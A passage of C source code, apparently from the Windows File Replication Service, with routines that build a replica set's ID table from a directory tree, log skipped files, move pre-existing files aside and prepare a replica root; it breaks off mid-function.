            DPRINT2(0,"++ Error writing to skipped file %ws, WStatus %s\n",
                    FullFilePath, ErrLabelW32(GetLastError()));
            FRS_CLOSE(LoadContext->SkippedFileHandle);
            goto CLEANUP;
        }
    }

    //
    // Get Full path of the directory. Write it to the file of missed files.
    //
    Path = FrsGetFullPathByHandle(DirectoryName, DirectoryHandle);

    if (Path) {
        FullDirPath = FrsWcsCat(Replica->Volume, Path);
    } else {
        DPRINT1(0, "Failed to get full path of directory: %ws\n", DirectoryName);
        goto CLEANUP;
    }


    //
    // The volume path above is in the form of \\.\E: which is necessary to
    // open a volume handle (( check this )).  But we need \\?\E: here to
    // allow long path names to work.  See CreateFile API description in SDK.
    //
    if (FullDirPath[2] == L'.') {
        FullDirPath[2] = L'?';
    }

    FullFilePath = FrsWcsPath(FullDirPath, FileName);

    FrsPrintLongUStr(4, DEBSUB, __LINE__, FullFilePath);

    BufPath = FrsAlloc(sizeof(WCHAR)*(wcslen(FullFilePath) + 3));

    //
    // 0x0d and 0x0a form the unicode carriage-return and linefeed.
    // Change this with a cleaner way to get "\n" in the unicode file.
    //
    swprintf(BufPath,L"%ws%c%c",FullFilePath,0x0d,0x0a);

    BStatus = WriteFile(LoadContext->SkippedFileHandle,BufPath,
              sizeof(WCHAR)*(wcslen(FullFilePath) + 2),
              &BytesWritten,NULL);

    if (BStatus != TRUE) {
        DPRINT2(0,"++ Error writing to skipped file %ws, WStatus %s\n",
                FullFilePath, ErrLabelW32(GetLastError()));
        goto CLEANUP;
    }


CLEANUP:
    FrsFree(BufPath);
    FrsFree(Path);
    FrsFree(FullDirPath);
    FrsFree(FullFilePath);

    return;
}


DWORD
DbsLoadReplicaFileTreeWorker(
    IN  HANDLE                      DirectoryHandle,
    IN  PWCHAR                      DirectoryName,
    IN  DWORD                       DirectoryLevel,
    IN  PFILE_DIRECTORY_INFORMATION DirectoryRecord,
    IN  DWORD                       DirectoryFlags,
    IN  PWCHAR                      FileName,
    IN  PLOAD_CONTEXT               LoadContext
    )
{
/*++

Routine Description:

    Search a directory tree and build the inital IDTable.

Arguments:

    DirectoryHandle     - Handle for this directory.
    DirectoryName       - Relative name of directory
    DirectoryLevel      - Directory level (0 == root)
    DirectoryFlags      - See tablefcn.h, ENUMERATE_DIRECTORY_FLAGS_
    DirectoryRecord     - Record from DirectoryHandle
    FileName            - From DirectoryRecord (w/terminating NULL)
    LoadContext         - global info and state

Return Value:

    WIN32 Error Status.

--*/
#undef DEBSUB
#define DEBSUB  "DbsLoadReplicaFileTreeWorker:"

    DWORD                   FStatus;
    DWORD                   WStatus;
    NTSTATUS                NtStatus;
    JET_ERR                 jerr;
    ULONG                   LevelCheck;
    PTABLE_CTX              TableCtx;
    PIDTABLE_RECORD         IDTableRec;
    PCONFIG_TABLE_RECORD    ConfigRecord;
    PREPLICA                Replica;
    UNICODE_STRING          ObjectName;
    OBJECT_ATTRIBUTES       ObjectAttributes;
    IO_STATUS_BLOCK         IoStatusBlock;
    GUID                    SaveParentGuid;
    LONGLONG                SaveParentFileID;
    BOOL                    Excluded;
    BOOL                    ExistingOid;
    HANDLE                  FileHandle = INVALID_HANDLE_VALUE;
    PVV_ENTRY               OutlogVVEntry;
    BOOL                    FileSkipped = FALSE;

    //
    // Abort if service is shutting down.
    //
    if (FrsIsShuttingDown) {
        DPRINT(0, "WARN - IDTable Load aborted; service shutting down\n");
        WStatus = ERROR_PROCESS_ABORTED;
        goto CLEANUP;
    }


    //
    // Filter out temporary files.
    //
    if (DirectoryRecord->FileAttributes & FILE_ATTRIBUTE_TEMPORARY) {
        WStatus = ERROR_SUCCESS;
        goto CLEANUP;
    }

    //
    // Choose filter list and level (caller filters . and ..)
    //
    Replica = LoadContext->Replica;
    ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);
    if (DirectoryRecord->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        //
        // No dirs at the bottom level in the volume filter table.
        //
        LevelCheck = ConfigRecord->ReplDirLevelLimit-1;
        LoadContext->NumDirs++;
    } else {
        //
        // Files are allowed at the bottom level.
        //
        LevelCheck = ConfigRecord->ReplDirLevelLimit;
        LoadContext->NumFiles++;
    }

    //
    // If the Level Limit is exceeded then skip the file or dir.
    // Skip files or dirs matching an entry in the respective exclusion list.
    //
    if (DirectoryLevel >= LevelCheck) {
        LoadContext->NumFiltered++;
        WStatus = ERROR_SUCCESS;
        goto CLEANUP;
    }
    ObjectName.Length = (USHORT)DirectoryRecord->FileNameLength;
    ObjectName.MaximumLength = (USHORT)DirectoryRecord->FileNameLength;
    ObjectName.Buffer = DirectoryRecord->FileName;

    LOCK_REPLICA(Replica);

    //
    // If not explicitly included then check the excluded filter list.
    //
    Excluded = FALSE;
    if (DirectoryRecord->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        if (!FrsCheckNameFilter(&ObjectName, &Replica->DirNameInclFilterHead)) {
            Excluded = FrsCheckNameFilter(&ObjectName, &Replica->DirNameFilterHead);
        }
    } else {
        if (!FrsCheckNameFilter(&ObjectName, &Replica->FileNameInclFilterHead)) {
            Excluded = FrsCheckNameFilter(&ObjectName, &Replica->FileNameFilterHead);
        }
    }

    UNLOCK_REPLICA(Replica);

    if (Excluded) {
        LoadContext->NumFiltered++;
        WStatus = ERROR_SUCCESS;
        goto CLEANUP;
    }

    TableCtx = &LoadContext->RtCtx->IDTable;
    IDTableRec = (PIDTABLE_RECORD) TableCtx->pDataRecord;

    //
    // Set the value of the Parent Guid & File ID from our caller.
    //
    COPY_GUID(&IDTableRec->ParentGuid, &LoadContext->ParentGuid);
    IDTableRec->ParentFileID = LoadContext->ParentFileID;

    //
    // Add the file name to the data record.
    //
    wcsncpy(IDTableRec->FileName, FileName, MAX_PATH+1);
    IDTableRec->FileName[MAX_PATH] = L'\0';

    //
    // Open the file and build the ID Table entry from the file data.
    // Open with WRITE Access in case we need to write the Object ID.
    //

    //
    // Can't open readonly file with write access. Reset
    // READONLY|SYSTEM|HIDDEN attributes temporarily so that
    // the file/dir can be open for write access.
    //
    if (DirectoryRecord->FileAttributes & NOREPL_ATTRIBUTES) {
        NtStatus = DbsLoadReplicaFileTreeForceOpen(&FileHandle,
                                                   DirectoryHandle,
                                                   DirectoryName,
                                                   DirectoryLevel,
                                                   DirectoryRecord,
                                                   DirectoryFlags,
                                                   FileName,
                                                   LoadContext);
    } else {

        //
        // Relative open
        //
        ZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
        ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
        ObjectAttributes.ObjectName = &ObjectName;
        ObjectAttributes.RootDirectory = DirectoryHandle;
        NtStatus = NtCreateFile(&FileHandle,
//                                WRITE_ACCESS | READ_ACCESS,
//                                STANDARD_RIGHTS_READ | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES | ACCESS_SYSTEM_SECURITY | SYNCHRONIZE | FILE_LIST_DIRECTORY,
                                READ_ATTRIB_ACCESS | WRITE_ATTRIB_ACCESS |
                                (BooleanFlagOn(DirectoryRecord->FileAttributes, FILE_ATTRIBUTE_DIRECTORY) ? FILE_LIST_DIRECTORY : 0),
                                &ObjectAttributes,
                                &IoStatusBlock,
                                NULL,                  // AllocationSize
                                FILE_ATTRIBUTE_NORMAL,
                                (FILE_SHARE_READ |
                                 FILE_SHARE_WRITE |
                                 FILE_SHARE_DELETE),
                                FILE_OPEN,
                                OPEN_OPTIONS,
                                NULL,                  // EA buffer
                                0                      // EA buffer size
                                );

    }

    //
    // Error opening file or directory
    //
    if (!NT_SUCCESS(NtStatus)) {
        DPRINT1_NT(0, "ERROR - Skipping %ws: NtCreateFile()/ForceOpen().",
                   FileName, NtStatus);
        if (DirectoryFlags & ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE) {
            WStatus = ERROR_SUCCESS;
        } else {
            WStatus = FrsSetLastNTError(NtStatus);
        }
        LoadContext->NumSkipped++;

        FileSkipped = TRUE;

        goto CLEANUP;
    }

    //
    // Mark the handle so that we do not pick this journal record.
    //
    WStatus = FrsMarkHandle(LoadContext->Replica->pVme->VolumeHandle, FileHandle);
    DPRINT1_WS(0, "++ WARN - FrsMarkHandle(%ws)", DirectoryRecord->FileName, WStatus);

    //
    // Create an IDTable Entry for this file preserving the OID if requested.
    //
    ExistingOid = PreserveFileOID;
    WStatus = DbsInitializeIDTableRecord(TableCtx,
                                         FileHandle,
                                         Replica,
                                         NULL,
                                         FileName,
                                         &ExistingOid);

    DBS_DISPLAY_RECORD_SEV(5, TableCtx, FALSE);
    //
    // Insert the entry.
    //
    if (IDTableRec->ReplEnabled) {
        jerr = DbsWriteReplicaTableRecord(LoadContext->ThreadCtx,
                                          Replica->ReplicaNumber,
                                          TableCtx);
        if (!JET_SUCCESS(jerr)) {
            DPRINT_JS(0, "ERROR - writing IDTable record:", jerr);
        } else {

            //
            // Update the OutlogVVector as there are no COs that are going into the
            // outlog during a primary load. If we do not update the OutlogVVector then
            // a subsequent VVJoin will do optimized vvjoin instead of full idtable scan.
            //
            LOCK_GEN_TABLE(Replica->OutlogVVector);

            OutlogVVEntry = GTabLookupNoLock(Replica->OutlogVVector, &IDTableRec->OriginatorGuid, NULL);

            if (OutlogVVEntry == NULL) {
                OutlogVVEntry = FrsAlloc(sizeof(VV_ENTRY));
                COPY_GUID(&OutlogVVEntry->GVsn.Guid, &IDTableRec->OriginatorGuid);
                //
                // Copy the value from the idtable record for this file.
                //
                OutlogVVEntry->GVsn.Vsn = IDTableRec->OriginatorVSN;

                //
                // Initialize the list head. We do not use the list head for outlogVV
                // but we still need to initialize it because the APIs that work with
                // VVs expect it.
                //
                InitializeListHead(&OutlogVVEntry->ListHead);

                //
                // Add it to the outlog version vector table.
                //
                GTabInsertEntryNoLock(Replica->OutlogVVector, OutlogVVEntry, &OutlogVVEntry->GVsn.Guid, NULL);
            } else {
                //
                // Copy the value from the idtable record for this file.
                //
                OutlogVVEntry->GVsn.Vsn = IDTableRec->OriginatorVSN;
            }

            UNLOCK_GEN_TABLE(Replica->OutlogVVector);

            //
            // Keep the VVector up-to-date for vvjoin
            //
            FStatus = DbsUpdateVV(LoadContext->ThreadCtx,
                                  Replica,
                                  LoadContext->RtCtx,
                                  IDTableRec->OriginatorVSN,
                                  &IDTableRec->OriginatorGuid);
            DPRINT1_FS(0, "ERROR - Updating VV for %ws;", IDTableRec->FileName, FStatus);

            if (!FRS_SUCCESS(FStatus)) {
                jerr = JET_errInvalidLoggedOperation;
            }
        }
    }

    if ((!IDTableRec->ReplEnabled) || (!JET_SUCCESS(jerr))) {
        //
        // LOG an error message so the user or admin can see what happened.
        //
        DPRINT1(0, "ERROR - Replication disabled for file %ws\n", FileName);
        LoadContext->NumSkipped++;
        FileSkipped = TRUE;

        if (DirectoryFlags & ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE) {
            WStatus = ERROR_SUCCESS;
        } else {
            WStatus = ERROR_REQUEST_ABORTED;
        }
        goto CLEANUP;
    }

    //
    // Abort if service is shutting down.
    //
    if (FrsIsShuttingDown) {
        DPRINT(0, "WARN - IDTable Load aborted; service shutting down\n");
        WStatus = ERROR_PROCESS_ABORTED;
        goto CLEANUP;
    }

    //
    // Recurse
    //
    if (DirectoryRecord->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        //
        // Save context information across recursions
        //
        COPY_GUID(&SaveParentGuid, &LoadContext->ParentGuid);
        SaveParentFileID = LoadContext->ParentFileID;
        COPY_GUID(&LoadContext->ParentGuid, &IDTableRec->FileObjID);
        LoadContext->ParentFileID = IDTableRec->FileID;
        WStatus = FrsEnumerateDirectoryRecurse(DirectoryHandle,
                                               DirectoryName,
                                               DirectoryLevel,
                                               DirectoryRecord,
                                               DirectoryFlags,
                                               FileName,
                                               FileHandle,
                                               LoadContext,
                                               DbsLoadReplicaFileTreeWorker);
        //
        // Restore context
        //
        COPY_GUID(&LoadContext->ParentGuid, &SaveParentGuid);
        LoadContext->ParentFileID = SaveParentFileID;
        if (!WIN_SUCCESS(WStatus)) {
            goto CLEANUP;
        }
    }

    WStatus = ERROR_SUCCESS;

CLEANUP:

    if (FileSkipped == TRUE) {
        DbsAddtoListOfSkippedFiles(Replica, DirectoryHandle, DirectoryName, FileName, LoadContext);
    }

    FRS_CLOSE(FileHandle);

    return WStatus;
}


ULONG
DbsLoadReplicaFileTree(
    IN PTHREAD_CTX         ThreadCtx,
    IN PREPLICA            Replica,
    IN PREPLICA_THREAD_CTX RtCtx,
    IN LPTSTR              RootPath
    )
{
/*++

Routine Description:

    Search a directory tree and build the inital IDTable.
    It is REQUIRED that the root path begin with a drive letter.


Arguments:

    ThreadCtx -- A Thread context to use for dbid and sesid.

    Replica - The Replica struct for this replica set.

    RtCtx - The Replica Thread Context to use in building the ID Table.

    RootPath - Root of replica set

Return Value:

    WIN32 Error Status.

--*/
#undef DEBSUB
#define DEBSUB  "DbsLoadReplicaFileTree:"

    DWORD                   FStatus;
    DWORD                   WStatus;
    JET_ERR                 jerr;
    PTABLE_CTX              TableCtx;
    PIDTABLE_RECORD         IDTableRec;
    DWORD                   FileAttributes;
    HANDLE                  FileHandle = INVALID_HANDLE_VALUE;
    HANDLE                  AttrHandle = INVALID_HANDLE_VALUE;
    BOOL                    ResetAttrs = FALSE;
    LOAD_CONTEXT            LoadContext;
    FILE_OBJECTID_BUFFER    ObjectIdBuffer;
    PCONFIG_TABLE_RECORD    ConfigRecord;
    BOOL                    ExistingOid;
    PWCHAR                  Path = NULL;
    PWCHAR                  FullPath = NULL;

    TableCtx = &RtCtx->IDTable;
    IDTableRec = (PIDTABLE_RECORD) TableCtx->pDataRecord;
    ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);

    DPRINT3(5, "^^^^^ TableCtx %08x, IDTableRec %08x, ConfigRecord %08x\n",
           TableCtx, IDTableRec, ConfigRecord);

    //
    // Process the root node outside the recursive directory scan
    //
    DPRINT1(4, "****  Begin DbsLoadReplicaFileTree of %ws *******\n", RootPath);

    FileAttributes = GetFileAttributes(RootPath);
    if (FileAttributes == 0xFFFFFFFF) {
        WStatus = GetLastError();
        DPRINT1_WS(0, "ERROR - GetFileAttributes(%ws);", RootPath, WStatus);
        //
        // I don't know why the error code is mapped to this value
        // but, bsts...
        //
        WStatus = ERROR_BAD_PATHNAME;
        goto CLEANUP;
    } else {
        if (!(FileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            DPRINT1(0, "ERROR - Root path (%ws) is not an directory\n", RootPath);
            WStatus = ERROR_BAD_PATHNAME;
            goto CLEANUP;
        }
    }
    //
    // If the ID table is not empty then don't do the initial load of
    // the ID table.
    //
    if (JET_SUCCESS(DbsTableMoveFirst(ThreadCtx,
                          TableCtx,
                          Replica->ReplicaNumber,
                          GuidIndexx))) {
        DPRINT1(4, "IDTable for Replica %ws not empty.  Load skiped\n",
               Replica->ReplicaName->Name);
        WStatus = ERROR_FILE_EXISTS;
        goto CLEANUP;
    }

    //
    // Can't open readonly dir with write access. Reset
    // READONLY|SYSTEM|HIDDEN attributes temporarily so that
    // the file/dir can be open for write access.
    //
    if (FileAttributes & NOREPL_ATTRIBUTES) {
        if (!SetFileAttributes(RootPath,
                               ((FileAttributes & ~NOREPL_ATTRIBUTES) | FILE_ATTRIBUTE_NORMAL))) {
            WStatus = GetLastError();
            DPRINT1_WS(0, "WARN - IGNORE SetFileAttributes(%ws);", RootPath, WStatus);
        } else {
            ResetAttrs = TRUE;
        }
    }

    //
    // Make sure the object ID on the root of our tree is correct.
    // Always open the replica root by masking off the FILE_OPEN_REPARSE_POINT flag
    // because we want to open the destination dir not the junction if the root
    // happens to be a mount point.
    //
    WStatus = FrsOpenSourceFileW(&FileHandle,
                                 RootPath,
//                                 WRITE_ACCESS | READ_ACCESS,
                                 READ_ATTRIB_ACCESS | WRITE_ATTRIB_ACCESS | FILE_LIST_DIRECTORY,
                                 OPEN_OPTIONS & ~FILE_OPEN_REPARSE_POINT);
    CLEANUP1_WS(0, "ERROR - FrsOpenSourceFile(%ws); ", RootPath, WStatus, CLEANUP);

    //
    // Set the attributes back to their original value
    //
    if (ResetAttrs) {
        if (!SetFileAttributes(RootPath, FileAttributes | FILE_ATTRIBUTE_NORMAL)) {
            WStatus = GetLastError();
            DPRINT1_WS(0, "WARN - IGNORE SetFileAttributes(reset %ws);", RootPath, WStatus);
        } else {
            ResetAttrs = FALSE;
        }
    }

    //
    // Stamp the replica Root GUID on the object ID of the
    // root dir.  Mutliple replica members of a given replica set
    // can be on the same machine but must be on distinct volumes.
    // This is because a given file in a replica tree has an object ID
    // which must be the same for all replica members but NTFS requires
    // the file object IDs to be unique on a volume.
    //
    // Restricting multi-member sets to different volumes may no longer
    // be necessary since the root guid is now unique for every replica
    // set creation.
    //
    ZeroMemory(&ObjectIdBuffer, sizeof(FILE_OBJECTID_BUFFER));
    COPY_GUID(&ObjectIdBuffer, &ConfigRecord->ReplicaRootGuid);

    WStatus = FrsGetOrSetFileObjectId(FileHandle, RootPath, TRUE, &ObjectIdBuffer);
    if (!WIN_SUCCESS(WStatus)) {
        goto CLEANUP;
    }

    //
    // Replica tree root does not have a parent
    //
    ZeroMemory(&IDTableRec->ParentGuid, sizeof(GUID));
    IDTableRec->ParentFileID = (LONGLONG)0;

    //
    // The root of the replica tree is always a keeper
    //
    wcsncpy(IDTableRec->FileName, L"<<<ReplicaTreeRoot>>>", MAX_PATH + 1);

    //
    // Create an IDTable Entry for this file.
    //
    ExistingOid = TRUE;
    WStatus = DbsInitializeIDTableRecord(TableCtx,
                                         FileHandle,
                                         Replica,
                                         NULL,
                                         RootPath,
                                         &ExistingOid);
    DBS_DISPLAY_RECORD_SEV(5, TableCtx, FALSE);
    //
    // Insert the entry.
    //
    if (IDTableRec->ReplEnabled) {
        jerr = DbsWriteReplicaTableRecord(ThreadCtx,
                                          Replica->ReplicaNumber,
                                          TableCtx);
        if (!JET_SUCCESS(jerr)) {
            DPRINT1_JS(0, "ERROR - writing IDTable record for %ws; ",
                       IDTableRec->FileName, jerr);
        } else {

            //
            // Keep the VVector up-to-date for vvjoin
            //
            FStatus = DbsUpdateVV(ThreadCtx,
                                  Replica,
                                  RtCtx,
                                  IDTableRec->OriginatorVSN,
                                  &IDTableRec->OriginatorGuid);
            DPRINT1_FS(0, "ERROR - Updating VV for %ws;", IDTableRec->FileName, FStatus);
            if (!FRS_SUCCESS(FStatus)) {
                jerr = JET_errInvalidLoggedOperation;
            }
        }
    }

    if ((!IDTableRec->ReplEnabled) || (!JET_SUCCESS(jerr))) {
        //
        // LOG an error message so the user or admin can see what happened.
        //
        DPRINT1_JS(0, "ERROR - Replication disabled for file %ws;", RootPath, jerr);
        WStatus = ERROR_GEN_FAILURE;
        goto CLEANUP;
    }


    //
    // If this replica set member is not marked as the primary then skip
    // the initial directory load (other than the root which was just done).
    // This member gets all its files with a VVJOIN request to an
    // inbound partner.
    //
    if (!BooleanFlagOn(Replica->CnfFlags, CONFIG_FLAG_PRIMARY)) {
        WStatus = ERROR_SUCCESS;
        goto CLEANUP;
    }

    //
    // Advance to the next level
    //
    ZeroMemory(&LoadContext, sizeof(LoadContext));
    LoadContext.ParentFileID = IDTableRec->FileID;
    COPY_GUID(&LoadContext.ParentGuid, &IDTableRec->FileObjID);
    LoadContext.Replica = Replica;
    LoadContext.RtCtx = RtCtx;
    LoadContext.ThreadCtx = ThreadCtx;
    LoadContext.SkippedFileHandle = INVALID_HANDLE_VALUE;

    WStatus = FrsEnumerateDirectory(FileHandle,
                                    RootPath,
                                    1,          // level 0 is root
                                    ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE,
                                    &LoadContext,
                                    DbsLoadReplicaFileTreeWorker);

    //
    // Check if any files were skipped during the primary load.
    // If a file was skipped then the handle to the file containing
    // the list of skipped files is valid.
    //
    if (HANDLE_IS_VALID(LoadContext.SkippedFileHandle)) {                                          \

        Path = FrsGetFullPathByHandle(NTFRS_SKIPPED_FILES, LoadContext.SkippedFileHandle);

        if (Path != NULL) {
           FullPath = FrsWcsCat(Replica->Volume, Path);
        }

        if (FullPath != NULL) {
            //
            // The volume path above is in the form of \\.\E: which is necessary to
            // open a volume handle (( check this )).  But we need \\?\E: here to
            // allow long path names to work.  See CreateFile API description in SDK.
            //
            if (FullPath[2] == L'.') {
                FullPath[2] = L'?';
            }

            EPRINT2(EVENT_FRS_FILES_SKIPPED_DURING_PRIMARY_LOAD,
                    Replica->SetName->Name,
                    FullPath);
        }

        FRS_CLOSE(LoadContext.SkippedFileHandle);

        Path = FrsFree(Path);
        FullPath = FrsFree(FullPath);
    }

    if (!WIN_SUCCESS(WStatus)) {
        goto CLEANUP;
    }
    DPRINT4(4, "Load File Tree done: %d dirs; %d files; %d skipped, %d filtered\n",
            LoadContext.NumDirs, LoadContext.NumFiles,
            LoadContext.NumSkipped, LoadContext.NumFiltered);

    DPRINT(5, "****************  Done  DbsLoadReplicaFileTree  ****************\n");

    WStatus = ERROR_SUCCESS;

CLEANUP:

    FRS_CLOSE(FileHandle);
    FRS_CLOSE(AttrHandle);

    //
    // Set the attributes back to their original value
    //
    if (ResetAttrs) {
        if (!SetFileAttributes(RootPath, FileAttributes | FILE_ATTRIBUTE_NORMAL)) {
            DPRINT1_WS(0, "WARN - IGNORE SetFileAttributes(cleanup %ws);",
                    RootPath, GetLastError());
        }
    }
    return WStatus;
}



DWORD
DbsEnumerateDirectoryPreExistingWorker(
    IN  HANDLE                      DirectoryHandle,
    IN  PWCHAR                      DirectoryName,
    IN  DWORD                       DirectoryLevel,
    IN  PFILE_DIRECTORY_INFORMATION DirectoryRecord,
    IN  DWORD                       DirectoryFlags,
    IN  PWCHAR                      FileName,
    IN  PPREEXISTING                PreExisting
    )
/*++
Routine Description:
    Move existing files over into the preexisting directory. Create
    if needed.

Arguments:
    DirectoryHandle     - Handle for this directory.
    DirectoryName       - Relative name of directory
    DirectoryLevel      - Directory level (0 == root)
    DirectoryFlags      - See tablefcn.h, ENUMERATE_DIRECTORY_FLAGS_
    DirectoryRecord     - Record from DirectoryHandle
    FileName            - From DirectoryRecord (w/terminating NULL)
    PreExisting         - Context

Return Value:
    Win32 Status
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsEnumerateDirectoryPreExistingWorker:"
    DWORD   WStatus = ERROR_SUCCESS;
    PWCHAR  OldPath = NULL;
    PWCHAR  NewPath = NULL;
    HANDLE FileHandle = INVALID_HANDLE_VALUE;
    HANDLE PreExistingDirHandle = INVALID_HANDLE_VALUE;
    ULONG OpenOptions = 0;
    //
    // Abort enum if shutting down.
    //
    if (FrsIsShuttingDown) {
        return ERROR_OPERATION_ABORTED;
    }

    //
    // Preexisting directory; don't move it
    //
    if (WSTR_EQ(FileName, NTFRS_PREEXISTING_DIRECTORY)) {
        WStatus = ERROR_SUCCESS;
        goto CLEANUP;
    }

    OldPath = FrsWcsPath(PreExisting->RootPath, FileName);
    NewPath = FrsWcsPath(PreExisting->PreExistingPath, FileName);

    OpenOptions =  (FILE_SYNCHRONOUS_IO_NONALERT |
            FILE_OPEN_FOR_BACKUP_INTENT  |
            FILE_WRITE_THROUGH |
            FILE_OPEN_REPARSE_POINT);

    WStatus = FrsOpenSourceFileW(&FileHandle,
                  OldPath,
                  FILE_READ_ATTRIBUTES | DELETE | SYNCHRONIZE,
                  OpenOptions                 
                  );


    if (!WIN_SUCCESS(WStatus)) {
        DPRINT1_WS(0, "ERROR - FrsOpenSourceFileW (%ws)", OldPath, WStatus);
        goto CLEANUP;
    }

    WStatus = FrsOpenSourceFileW(&PreExistingDirHandle,
                  PreExisting->PreExistingPath,
                  FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                  OpenOptions                 
                  );
    if (!WIN_SUCCESS(WStatus)) {
        DPRINT1_WS(0, "ERROR - FrsOpenSourceFileW (%ws)", PreExisting->PreExistingPath, WStatus);
        goto CLEANUP;
    }


    WStatus = FrsRenameByHandle(FileName,
                wcslen(FileName) * sizeof(WCHAR),
                FileHandle,
                PreExistingDirHandle,
                TRUE //ReplaceIfExists
                );

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT2_WS(0, "ERROR - FrsRenameByHandle. Cannot move \"%ws\" to \"%ws\"", OldPath, NewPath, WStatus);
        goto CLEANUP;
    } else {
        PreExisting->MovedAFile = TRUE;
    }

CLEANUP:
    FrsFree(OldPath);
    FrsFree(NewPath);
    FRS_CLOSE(FileHandle);
    FRS_CLOSE(PreExistingDirHandle);
    return WStatus;
}




ULONG
DbsPrepareRoot(
    IN PREPLICA Replica
    )
/*++

Routine Description:

    Delete the current preexisting directory and the current preinstall
    directory. If Root contains objects, move them into a newly
    created preexisting directory. Create the preinstall directory.

    WARN: The replica set must not exist.

Arguments:

    Replica - The replica is not in the DB but the checks for
              overlapping directories has been completed.

Return Value:

    WIN32 STATUS

--*/
{
#undef DEBSUB
#define DEBSUB "DbsPrepareRoot:"
    ULONG       WStatus;
    DWORD       NumberOfPartners;
    DWORD       BurFlags;
    DWORD       RegLen;
    DWORD       RegType;
    HANDLE      RootHandle          = INVALID_HANDLE_VALUE;
    PWCHAR      PreInstallPath      = NULL;
    PWCHAR      PreExistingPath     = NULL;
    HKEY        hKey                = INVALID_HANDLE_VALUE;
    PREEXISTING PreExisting;
    WCHAR       GuidW[GUID_CHAR_LEN + 1];
    DWORD       NumOfCxtions;
    BOOL        bStatus             = FALSE;
    PWCHAR      CmdFile             = NULL;
    BOOL        NewlyCreated        = FALSE;

    DPRINT3(4, "Preparing root %ws for %ws\\%ws\n",
            Replica->Root, Replica->SetName->Name, Replica->MemberName->Name);


    //
    // Delete any NTFRS Command files that may exist under the root.
    // E.g. NTFRS_CMD_FILE_MOVE_ROOT
    //
    CmdFile = FrsWcsCat3(Replica->Root, L"\\", NTFRS_CMD_FILE_MOVE_ROOT);
    if (GetFileAttributes(CmdFile) != 0xffffffff) {
        bStatus = DeleteFile(CmdFile);
        if (!bStatus) {
            DPRINT2(0,"ERROR - Deleting Command file %ws. WStatus = %d\n", CmdFile, GetLastError());
        }
    }
    CmdFile = FrsFree(CmdFile);

    //
    // Delete the preinstall directory (continue on error)
    //
    PreInstallPath = FrsWcsPath(Replica->Root, NTFRS_PREINSTALL_DIRECTORY);
    WStatus = FrsDeletePath(PreInstallPath, ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE);
    DPRINT1_WS(3, "++ Warn - FrsDeletePath(%ws) (IGNORED);", PreInstallPath, WStatus);

    //
    // Delete the preexisting directory (continue on error)
    //
    PreExistingPath = FrsWcsPath(Replica->Root, NTFRS_PREEXISTING_DIRECTORY);
    WStatus = FrsDeletePath(PreExistingPath, ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE);
    DPRINT1_WS(3, "++ ERROR - FrsDeletePath(%ws) (IGNORED);", PreExistingPath, WStatus);

    //
    // Have we seen this set before? If so, did it have partners?
    // Recreating w/partners   - Reset primary (move files out of way)
    // Recreating w/o partners - Set primary (reload idtable from files)
    // Creating w or w/o partners - Respect primary flag
    //
    // Open the Replica Sets section and fetch the number of partners.
    //
    GuidToStrW(Replica->MemberName->Guid, GuidW);

    WStatus = CfgRegOpenKey(FKC_CUMSET_N_NUMBER_OF_PARTNERS, GuidW, 0, &hKey);

    //
    // If brand new replica; no assumptions about primary can be made
    //
    CLEANUP3_WS(4, "++ WARN - Cannot query partners for %ws, %ws\\%ws (assuming new replica) :",
                Replica->SetName->Name, FRS_CUMULATIVE_SETS_SECTION, GuidW,
                WStatus, MOVE_PREEXISTING_FILES);
    FRS_REG_CLOSE(hKey);


    //
    // Read the Number of Partners value.
    //
    WStatus = CfgRegReadDWord(FKC_CUMSET_N_NUMBER_OF_PARTNERS,
                              GuidW,
                              0,
                              &NumberOfPartners);
    //
    // If brand new replica; no assumptions about primary can be made
    //
    CLEANUP3_WS(4, "++ WARN - Cannot query partners for %ws, %ws\\%ws (assuming new replica) :",
                Replica->SetName->Name, FRS_CUMULATIVE_SETS_SECTION, GuidW,
                WStatus, MOVE_PREEXISTING_FILES);

    //
    // Read the Backup / Restore flags.
    //
    WStatus = CfgRegReadDWord(FKC_CUMSET_N_BURFLAGS, GuidW, 0, &BurFlags);

    if (!WIN_SUCCESS(WStatus)) {
        //
        // Can't check for BurFlags; Assume non-authoritative restore.
        //
        DPRINT4_WS(4, "++ WARN - Cannot query BurFlags for %ws, %ws\\%ws -> %ws;",
                Replica->SetName->Name, FRS_CUMULATIVE_SETS_SECTION, GuidW,
                FRS_VALUE_BURFLAGS, WStatus);
        DPRINT(4, "++ WARN - Assuming non-authoritative restore.\n");

        BurFlags = (NTFRSAPI_BUR_FLAGS_RESTORE |
                    NTFRSAPI_BUR_FLAGS_NON_AUTHORITATIVE);
        WStatus = ERROR_SUCCESS;
    }

    //
    // Recreating w/partners   - Reset primary (move files out of way)
    // Recreating w/o partners - Set primary (reload idtable from files)
    // If the NumOfCxtions is > 0, subtract 1 for the
    // journal connection which is not a real cxtion.
    //
    NumOfCxtions = GTabNumberInTable(Replica->Cxtions);
    if (NumOfCxtions) {
        NumOfCxtions -= 1;
    }
    DPRINT5(4, "++ Recreating %ws\\%ws; %d Reg, %d Ds, %08x CnfFlags\n",
            Replica->SetName->Name, Replica->MemberName->Name,
            NumberOfPartners, NumOfCxtions, Replica->CnfFlags);
    //
    // Primary restore
    //
    if ((BurFlags & NTFRSAPI_BUR_FLAGS_RESTORE) &&
        (BurFlags & NTFRSAPI_BUR_FLAGS_PRIMARY)) {
        //
        // Force a primary restore.  This means we reload the IDTable using
        // the files on disk.
        //
        DPRINT1(4, "++ Force primary on %ws\n", Replica->SetName->Name);
